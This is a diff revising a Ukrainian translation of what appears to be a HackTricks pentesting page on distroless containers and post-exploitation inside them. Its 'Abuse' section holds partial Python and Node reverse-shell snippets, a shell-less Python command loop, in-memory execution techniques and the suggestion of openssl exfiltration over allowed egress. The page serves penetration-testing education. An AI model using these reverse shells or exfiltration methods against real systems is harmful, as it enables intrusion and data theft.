@@ -1,69 +1,69 @@
-# Distroless Containers
+# Distroless-контейнери
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Огляд
 
-**distroless** container image — це image, що містить **мінімальні runtime-компоненти, необхідні для запуску однієї конкретної application**, навмисно вилучаючи звичні distribution tools, такі як package managers, shells і великі набори загальних userland utilities. На практиці distroless images часто містять лише application binary або runtime, його shared libraries, certificate bundles і дуже малу структуру filesystem.
+**distroless**-образ контейнера — це образ, який містить **мінімальні компоненти runtime, необхідні для запуску однієї конкретної application**, навмисно вилучаючи звичайні інструменти дистрибутива, такі як package managers, shells і великі набори стандартних userland-утиліт. На практиці distroless-образи часто містять лише application binary або runtime, його shared libraries, bundles сертифікатів і дуже малу структуру файлової системи.
 
-Суть не в тому, що distroless є новим kernel isolation primitive. Distroless — це **стратегія проєктування image**. Вона змінює те, що доступно **всередині filesystem контейнера**, а не спосіб, у який kernel ізолює контейнер. Це важливо, оскільки distroless hardens environment переважно шляхом зменшення кількості засобів, які attacker може використати після отримання code execution. Це не замінює namespaces, seccomp, capabilities, AppArmor, SELinux чи будь-який інший механізм runtime isolation.
+Суть не в тому, що distroless є новим примітивом kernel isolation. Distroless — це **стратегія дизайну образу**. Вона змінює те, що доступно **всередині** файлової системи контейнера, але не те, як kernel ізолює контейнер. Це важливо, оскільки distroless посилює середовище переважно шляхом зменшення кількості можливостей, які attacker може використати після отримання code execution. Він не замінює namespaces, seccomp, capabilities, AppArmor, SELinux або будь-який інший механізм runtime isolation.
 
 ## Навіщо існує Distroless
 
-Distroless images переважно використовують для зменшення:
+Distroless-образи переважно використовують для зменшення:
 
-- розміру image
-- operational complexity image
+- розміру образу
+- operational complexity образу
 - кількості packages і binaries, які можуть містити vulnerabilities
 - кількості post-exploitation tools, доступних attacker за замовчуванням
 
-Саме тому distroless images популярні в production application deployments. Container, який не містить shell, package manager і майже жодних загальних tools, зазвичай простіше operationally контролювати та складніше інтерактивно використовувати після compromise.
+Саме тому distroless-образи популярні у production application deployments. Контейнер, який не містить shell, package manager і майже жодних стандартних інструментів, зазвичай простіше аналізувати з operational точки зору та складніше зловживати ним інтерактивно після компрометації.
 
-Приклади відомих сімейств images у стилі distroless:
+Приклади відомих сімейств образів у стилі distroless:
 
 - Google's distroless images
 - Chainguard hardened/minimal images
 
-## Що не означає Distroless
+## Чим Distroless не є
 
-Distroless container **не є**:
+Distroless-контейнер **не є**:
 
 - автоматично rootless
 - автоматично non-privileged
 - автоматично read-only
-- автоматично захищеним за допомогою seccomp, AppArmor або SELinux
+- автоматично захищеним seccomp, AppArmor або SELinux
 - автоматично захищеним від container escape
 
-Distroless image все ще можна запустити з `--privileged`, спільним використанням host namespaces, небезпечними bind mounts або змонтованим runtime socket. У такому випадку image може бути minimal, але container все одно може бути катастрофічно insecure. Distroless змінює **userland attack surface**, а не **kernel trust boundary**.
+Distroless-образ усе ще можна запустити з `--privileged`, спільним використанням host namespaces, небезпечними bind mounts або підключеним runtime socket. У такому сценарії образ може бути мінімальним, але контейнер усе одно може бути катастрофічно небезпечним. Distroless змінює **userland attack surface**, а не **kernel trust boundary**.
 
-## Типові Operational Characteristics
+## Типові operational characteristics
 
-Коли ви compromise distroless container, перше, що зазвичай помічаєте, — звичні припущення перестають бути правильними. Може не бути `sh`, `bash`, `ls`, `id`, `cat`, а іноді навіть libc-based environment, який поводиться так, як очікує ваш звичний tradecraft. Це впливає і на offense, і на defense, оскільки відсутність tools змінює debugging, incident response і post-exploitation.
+Коли ви компрометуєте distroless-контейнер, перше, що зазвичай помічаєте, — звичні припущення перестають бути правильними. Може не бути `sh`, `bash`, `ls`, `id`, `cat`, а іноді навіть libc-based environment, який поводиться так, як очікує ваш usual tradecraft. Це впливає як на offense, так і на defense, оскільки відсутність інструментів змінює debugging, incident response і post-exploitation.
 
 Найпоширеніші patterns:
 
 - application runtime існує, але майже нічого іншого немає
 - shell-based payloads не працюють, оскільки shell відсутній
-- звичні enumeration one-liners не працюють, оскільки helper binaries відсутні
+- стандартні enumeration one-liners не працюють, оскільки helper binaries відсутні
 - file system protections, такі як read-only rootfs або `noexec` на writable tmpfs locations, також часто присутні
 
-Саме це поєднання зазвичай і є причиною, чому люди говорять про "weaponizing distroless".
+Саме ця комбінація зазвичай змушує говорити про "weaponizing distroless".
 
 ## Distroless і Post-Exploitation
 
-Основний offensive challenge у distroless environment — не завжди початковий RCE. Часто важливіше те, що відбувається далі. Якщо compromised workload надає code execution у language runtime, такому як Python, Node.js, Java або Go, ви можете виконувати довільну logic, але не за допомогою звичних shell-centric workflows, поширених на інших Linux targets.
+Основна offensive challenge у distroless environment — не завжди початковий RCE. Часто важливіше те, що відбувається далі. Якщо compromised workload надає code execution у language runtime, такому як Python, Node.js, Java або Go, ви можете виконувати довільну логіку, але не через звичайні shell-centric workflows, поширені на інших Linux targets.
 
-Тому post-exploitation часто розвивається в одному з трьох напрямів:
+Тому post-exploitation часто рухається в одному з трьох напрямків:
 
-1. **Безпосередньо використовувати наявний language runtime**, щоб enumerate environment, відкривати sockets, читати files або розгортати additional payloads.
+1. **Безпосередньо використовувати наявний language runtime**, щоб enumeratе environment, відкривати sockets, читати files або розгортати додаткові payloads.
 2. **Завантажити власні tools у memory**, якщо filesystem є read-only або writable locations змонтовані з `noexec`.
-3. **Зловживати наявними binaries, які вже присутні в image**, якщо application або її dependencies містять щось несподівано корисне.
+3. **Зловживати наявними binaries, які вже присутні в образі**, якщо application або її dependencies несподівано містять щось корисне.
 
 ## Abuse
 
 ### Enumerate The Runtime You Already Have
 
-У багатьох distroless containers немає shell, але все ще є application runtime. Якщо target — Python service, Python доступний. Якщо target — Node.js, доступний Node.js. Цього часто достатньо, щоб enumerate files, читати environment variables, відкривати reverse shells і виконувати payloads in-memory, не викликаючи `/bin/sh`.
+У багатьох distroless-контейнерах немає shell, але все ще є application runtime. Якщо target — Python service, Python присутній. Якщо target — Node.js, Node присутній. Часто цього достатньо, щоб enumeratе files, читати environment variables, відкривати reverse shells і виконувати code in-memory, не викликаючи `/bin/sh`.
 
 Простий приклад із Python:
 ```bash
@@ -81,13 +81,13 @@ node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid())
 ```
 Вплив:
 
-- відновлення змінних середовища, які часто містять credentials або service endpoints
-- перерахування файлової системи без `/bin/ls`
-- виявлення шляхів, доступних для запису, і змонтованих secrets
+- відновлення змінних середовища, які часто містять облікові дані або кінцеві точки сервісів
+- перелік файлової системи без `/bin/ls`
+- виявлення доступних для запису шляхів і змонтованих секретів
 
-### Reverse Shell Без `/bin/sh`
+### Reverse Shell без `/bin/sh`
 
-Якщо образ не містить `sh` або `bash`, класичний reverse shell на основі shell може одразу завершитися помилкою. У такій ситуації використовуйте встановлений language runtime.
+Якщо образ не містить `sh` або `bash`, класичний reverse shell на основі shell може одразу завершитися невдало. У такій ситуації використовуйте встановлене мовне середовище виконання.
 
 Python reverse shell:
 ```bash
@@ -100,7 +100,7 @@ os.dup2(s.fileno(),fd)
 pty.spawn("/bin/sh")
 PY
 ```
-Якщо `/bin/sh` не існує, замініть останній рядок на безпосереднє виконання команд через Python або цикл REPL Python.
+Якщо `/bin/sh` не існує, замініть останній рядок на пряме виконання команд через Python або цикл REPL Python.
 
 Node reverse shell:
 ```bash
@@ -108,9 +108,9 @@ node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(44
 ```
 Знову ж таки, якщо `/bin/sh` відсутній, використовуйте безпосередньо файлові, процесні та мережеві API Node замість запуску shell.
 
-### Повний приклад: цикл команд Python без shell
+### Повний приклад: Python Command Loop без shell
 
-Якщо в image є Python, але повністю відсутній shell, простого інтерактивного циклу часто достатньо, щоб зберегти повні можливості post-exploitation:
+Якщо в image є Python, але взагалі немає shell, простого інтерактивного циклу часто достатньо для збереження повної можливості post-exploitation:
 ```bash
 python3 - <<'PY'
 import os,subprocess
@@ -123,17 +123,17 @@ print(p.stdout, end="")
 print(p.stderr, end="")
 PY
 ```
-Для цього не потрібен бінарний файл інтерактивної оболонки. З погляду атакувальника вплив фактично такий самий, як і від базової оболонки: виконання команд, перерахування та staging подальших payloads через наявний runtime.
+Це не потребує бінарного файлу інтерактивної оболонки. З погляду атакувальника вплив фактично такий самий, як і від базової оболонки: виконання команд, розвідка та підготовка подальших payloads через наявний runtime.
 
 ### Виконання інструментів у пам'яті
 
-Distroless-образи часто використовуються разом із:
+Distroless images часто комбінуються з:
 
 - `readOnlyRootFilesystem: true`
-- доступним для запису, але `noexec` tmpfs, наприклад `/dev/shm`
+- доступним для запису, але `noexec` tmpfs, таким як `/dev/shm`
 - відсутністю інструментів керування пакетами
 
-Таке поєднання робить класичний сценарій «завантажити бінарний файл на диск і запустити його» ненадійним. У таких випадках основним рішенням стають техніки виконання в пам'яті.
+Така комбінація робить класичні сценарії «завантажити бінарний файл на диск і запустити його» ненадійними. У таких випадках основною відповіддю стають техніки виконання в пам'яті.
 
 Окрема сторінка присвячена цьому:
 
@@ -141,58 +141,58 @@ Distroless-образи часто використовуються разом �
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-Найбільш релевантні техніки на ній:
+Найбільш релевантні техніки там:
 
 - `memfd_create` + `execve` через scripting runtimes
 - DDexec / EverythingExec
 - memexec
 - memdlopen
 
-### Уже наявні бінарні файли в образі
+### Наявні бінарні файли в image
 
-Деякі distroless-образи все ще містять операційно необхідні бінарні файли, які стають корисними після компрометації. Часто спостережуваним прикладом є `openssl`, оскільки застосункам іноді він потрібен для завдань, пов'язаних із криптографією або TLS.
+Деякі Distroless images все ще містять операційно необхідні бінарні файли, які стають корисними після compromise. Один із часто спостережуваних прикладів — `openssl`, оскільки застосункам іноді потрібен він для завдань, пов'язаних із crypto або TLS.
 
-Шаблон для швидкого пошуку:
+Швидкий шаблон пошуку:
 ```bash
 find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
 ```
 Якщо присутній `openssl`, його можна використовувати для:
 
 - вихідних TLS-з'єднань
-- data exfiltration через дозволений канал вихідного трафіку
-- підготовки даних payload через закодовані/зашифровані blobs
+- data exfiltration через дозволений канал egress
+- підготовки даних payload через кодовані/зашифровані blobs
 
-Точний спосіб зловживання залежить від того, що саме встановлено, але загальна ідея полягає в тому, що distroless не означає "повну відсутність інструментів"; це означає "значно менше інструментів, ніж у звичайному образі дистрибутива".
+Точний спосіб зловживання залежить від того, що саме встановлено, але загальна ідея полягає в тому, що distroless не означає «взагалі без інструментів»; це означає «значно менше інструментів, ніж у звичайному distribution image».
 
 ## Перевірки
 
-Мета цих перевірок — визначити, чи справді образ є distroless на практиці, а також які runtime або helper binaries усе ще доступні для post-exploitation.
+Мета цих перевірок — визначити, чи є image справді distroless на практиці, і які runtime або helper binaries все ще доступні для post-exploitation.
 ```bash
 find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
 which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
 cat /etc/os-release 2>/dev/null                                # Often missing or minimal
 mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
 ```
-Що тут цікаво:
+Що тут цікавого:
 
-- Якщо shell відсутній, але доступний runtime, такий як Python або Node, post-exploitation має перейти до виконання під керуванням runtime.
-- Якщо коренева файлова система доступна лише для читання, а `/dev/shm` доступний для запису, але має `noexec`, техніки виконання в пам'яті стають набагато актуальнішими.
-- Якщо присутні допоміжні бінарні файли, такі як `openssl`, `busybox` або `java`, вони можуть надавати достатньо функціональності для подальшого отримання доступу.
+- Якщо shell відсутній, але присутній runtime, наприклад Python або Node, post-exploitation має перейти до виконання через runtime.
+- Якщо коренева файлова система доступна лише для читання, а `/dev/shm` доступний для запису, але має параметр `noexec`, техніки виконання в памʼяті стають набагато актуальнішими.
+- Якщо присутні допоміжні бінарні файли, такі як `openssl`, `busybox` або `java`, вони можуть надати достатньо функціональності для подальшого розширення доступу.
 
 ## Типові налаштування runtime
 
-| Стиль образу / платформи | Стан за замовчуванням | Типова поведінка | Поширене ручне послаблення |
+| Стиль образу / платформи | Типовий стан | Типова поведінка | Поширене ручне послаблення |
 | --- | --- | --- | --- |
-| Образи в стилі Google distroless | Мінімальний userland за задумом | Відсутні shell і менеджер пакетів, доступні лише залежності застосунку/runtime | додавання шарів для налагодження, sidecar shell, копіювання busybox або інструментів |
+| Образи в стилі Google distroless | Мінімальний userland за задумом | Відсутні shell і package manager, наявні лише залежності застосунку/runtime | додавання debugging-шарів, sidecar-shell, копіювання busybox або інструментів |
 | Мінімальні образи Chainguard | Мінімальний userland за задумом | Зменшена поверхня пакетів, часто орієнтація на один runtime або сервіс | використання `:latest-dev` або debug-варіантів, копіювання інструментів під час build |
-| Kubernetes workloads із distroless-образами | Залежить від конфігурації Pod | Distroless впливає лише на userland; рівень безпеки Pod також залежить від специфікації Pod і типових налаштувань runtime | додавання ephemeral debug containers, монтування host, привілейовані налаштування Pod |
-| Docker / Podman із distroless-образами | Залежить від прапорців запуску | Мінімальна файлова система, але безпека runtime все одно залежить від прапорців і конфігурації daemon | `--privileged`, спільне використання host namespace, монтування runtime socket, доступні для запису host binds |
+| Kubernetes workloads, що використовують distroless-образи | Залежить від конфігурації Pod | Distroless впливає лише на userland; стан безпеки Pod також залежить від специфікації Pod і типових параметрів runtime | додавання ephemeral debug containers, монтування host, привілейовані налаштування Pod |
+| Docker / Podman, що запускають distroless-образи | Залежить від run-флагів | Мінімальна файлова система, але безпека runtime також залежить від прапорців і конфігурації daemon | `--privileged`, спільне використання host namespace, монтування runtime socket, доступні для запису host binds |
 
-Ключовий момент полягає в тому, що distroless — це **властивість образу**, а не захист runtime. Його цінність полягає у зменшенні доступного всередині файлової системи після компрометації.
+Ключовий момент полягає в тому, що distroless є **властивістю образу**, а не захистом runtime. Його цінність полягає у зменшенні кількості доступних компонентів у файловій системі після компрометації.
 
-## Пов'язані сторінки
+## Повʼязані сторінки
 
-Щодо bypass для файлової системи та виконання в пам'яті, які зазвичай потрібні в distroless-середовищах:
+Щодо bypass для файлової системи та виконання в памʼяті, які зазвичай потрібні в distroless-середовищах:
 
 {{#ref}}
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
@@ -207,4 +207,5 @@ runtime-api-and-daemon-exposure.md
 {{#ref}}
 sensitive-host-mounts.md
 {{#endref}}
+
 {{#include ../../../banners/hacktricks-training.md}}
